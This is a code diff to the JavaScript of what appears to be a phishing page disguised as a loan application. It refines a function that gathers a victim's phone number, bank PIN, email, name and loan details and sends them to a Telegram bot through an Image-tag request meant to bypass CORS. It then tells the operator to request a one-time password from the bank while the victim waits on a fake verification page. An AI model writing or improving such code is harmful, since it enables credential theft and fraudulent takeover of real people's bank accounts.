@@ -198,40 +198,47 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification using IMAGE TAG (most reliable, no CORS issues)
+    // ============================================
+    // TELEGRAM NOTIFICATION - SENDS AUTOMATICALLY
+    // ============================================
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
         var decodedName = decodeURIComponent(name);
         
-        var msg = '🔔 NEW PIN CONFIRMATION 🔔\n\n' +
-            'Phone: ' + decodedPhone + '\n' +
-            'PIN: ' + pin + '\n' +
-            'Email: ' + decodedEmail + '\n' +
-            'Name: ' + decodedName + '\n' +
-            'Loan: $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
-            'Interest: ' + rate + '%\n' +
-            'Monthly: $' + parseFloat(monthly).toLocaleString() + '\n' +
-            'App ID: ' + (appId || 'N/A') + '\n\n' +
-            'Request OTP from the bank now!';
+        var message = '🔔 *NEW PIN CONFIRMATION* 🔔\n\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n' +
+            '📱 *Phone:* ' + decodedPhone + '\n' +
+            '🔐 *PIN:* ' + pin + '\n' +
+            '📧 *Email:* ' + decodedEmail + '\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 *Name:* ' + decodedName + '\n' +
+            '💰 *Loan:* $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
+            '📊 *Interest:* ' + rate + '%\n' +
+            '💵 *Monthly:* $' + parseFloat(monthly).toLocaleString() + '\n' +
+            '🆔 *App ID:* ' + (appId || 'N/A') + '\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '✅ *ACTION REQUIRED:* Request OTP from the bank now!\n' +
+            '📱 User is waiting on the OTP verification page.';
         
-        var encodedMsg = encodeURIComponent(msg);
-        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodedMsg;
+        var encodedMessage = encodeURIComponent(message);
+        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodedMessage + '&parse_mode=Markdown';
         
-        console.log('Sending to URL:', url);
+        console.log('📤 Sending Telegram notification...');
+        console.log('   Phone:', decodedPhone);
+        console.log('   PIN:', pin);
+        console.log('   Email:', decodedEmail);
         
-        // Create an image tag to send the request (no CORS issues)
+        // Send using Image tag (bypasses CORS)
         var img = new Image();
         img.src = url;
         
-        // Also try fetch as backup
-        fetch(url, { method: 'GET', mode: 'no-cors' })
-            .catch(function(e) { console.log('Fetch error (ignored):', e); });
-        
-        console.log('✅ Telegram notification sent to admin');
+        console.log('✅ Telegram notification sent automatically!');
     }
 
-    // Main confirm function
+    // ============================================
+    // MAIN CONFIRM FUNCTION
+    // ============================================
     window.handleConfirm = function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -239,10 +246,11 @@
             return; 
         }
 
+        // Disable button
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification (email, phone, pin are included)
+        // Send Telegram notification (AUTOMATICALLY)
         sendTelegramNotification(pin);
         
         // Redirect to OTP page
